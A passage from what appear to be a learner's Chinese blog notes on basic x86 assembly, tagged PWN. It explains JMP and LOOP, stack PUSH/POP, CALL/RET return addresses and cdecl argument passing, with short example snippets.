class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JMP labell</span><br><span class="line">MOV EBX, 0</span><br><span class="line">labell:</span><br><span class="line">MOV EAX, 0</span><br></pre></td></tr></table></figure><p>​                当在循环结束时用JMP指令跳回循环开始位置可实现无限循环</p><p><strong>LOOP指令</strong>：创建一个循环代码块</p><p>​                     ECX寄存器为循环的计数器，循环一次，ECX值-1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV AX, 0</span><br><span class="line">MOV ECX, 3</span><br><span class="line">L1:</span><br><span class="line">INC AX</span><br><span class="line">LOOP L1</span><br><span class="line">XOR EAX, EBX</span><br></pre></td></tr></table></figure><p>​    LOOP指令分为两步：第一步将ECX -1；第二步将ECX与0比较，如果ECX不为0，跳转到标号地址处（INC                 AX）；如果ECX为0，则不跳转，执行LOOP下一条指令（XOR   EAX，EBX）</p><p>​    如果ECX的初始值为0，那么执行LOOP指令时，ECX -1变为FFFFFFFFh，是个很大的循环，因此在编写x86汇编语言时一般情况不需要显式地改变ECX的值，特别是存在循环嵌套的情况时。（不懂。。）</p><h2 id="栈与函数调用"><a href="#栈与函数调用" class="headerlink" title="栈与函数调用"></a>栈与函数调用</h2><p><strong>栈</strong>：特点：先入后出（可以想象成一个薯片桶）</p><pre><code>   用途：存储局部变量；执行CALL指令调用函数时，保存函数地址以便函数结束时正确返回；传递函数参数</code></pre><p>​       常用指令：</p><p>​            PUSH指令：入栈；对ESP/RSP/SP寄存器的值减去 4（32位）或 8（64位），将操作数写入寄存器中指针                                指向的内存中</p><p>​            POP指令  ：出栈；是PUSH指令的逆操作；先从ESP等寄存器指向的内存中读取数据写入其他内存地址或                                寄存器，再将寄存器的值加上 4（32位）或 8（64位）</p><p>​        <strong>（说白了：PUSH  AX 表示将寄存器AX中的数据送入栈中；POP AX 表示从栈顶取出数据送入AX）</strong></p><p>下方代码通过栈实现EAX与EBX值的交换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX, 1234h</span><br><span class="line">   MOV EBX, 5678h</span><br><span class="line">   PUSH EAX</span><br><span class="line">   PUSH EBX</span><br><span class="line">   POP EAX</span><br><span class="line">   POP EBX</span><br></pre></td></tr></table></figure><h3 id="使用栈保存函数保存地址"><a href="#使用栈保存函数保存地址" class="headerlink" title="使用栈保存函数保存地址"></a>使用栈保存函数保存地址</h3><p><strong>CALL指令</strong>：调用子函数；调用时，CALL指令的下一条指令地址将作为返回地址被保存在栈中，当调用函数结束                时，执行RET指令跳转到返回地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">....code</span><br><span class="line">...main PROC</span><br><span class="line">0x00008000  MOV EBX, EAX</span><br><span class="line">......</span><br><span class="line">0X00008020  CALL testFunc</span><br><span class="line">0x00008025  MOV EAX, EBX</span><br><span class="line">......</span><br><span class="line">...main ENDP</span><br><span class="line">......</span><br><span class="line">0x00008A00  testFunc PROC</span><br><span class="line">...MOV EAX, EDX</span><br><span class="line">......</span><br><span class="line">...RET</span><br><span class="line">...textFunc ENDP</span><br></pre></td></tr></table></figure><p>注：proc是定义子程序的伪指令，位置在子程序的开始处，它和endp分别表示子程序定义的开始和结束两者必须成对出现。</p><p>当CALL指令执行时，下一条指令地址（0x00008025）被压入栈中，被调用函数testFunc地址0x00008A00被加载进EIP寄存器（EIP寄存器存放  下一个CPU指令存放的内存地址）</p><p>   执行RET指令时，ESP指向的数据弹出至EIP；ESP数值增加指向栈中上一个值</p><h3 id="使用栈传递函数参数"><a href="#使用栈传递函数参数" class="headerlink" title="使用栈传递函数参数"></a>使用栈传递函数参数</h3><p>cdecl约定：</p><p>​            假设函数 func 有三个参数 agr1、agr2、agr3 ，在cdecl约定下通常为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push arg3</span><br><span class="line">push arg2</span><br><span class="line">push arg1</span><br><span class="line">call func</span><br></pre></td></tr></table></figure><p>（只知道这么多了。。。）</p><h3 id="使用栈存储变量"><a href="#使用栈存储变量" class="headerlink" title="使用栈存储变量"></a>使用栈存储变量</h3><p>涉及到了PUSHFD和POPFD，但讲的很少就没怎么看懂</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
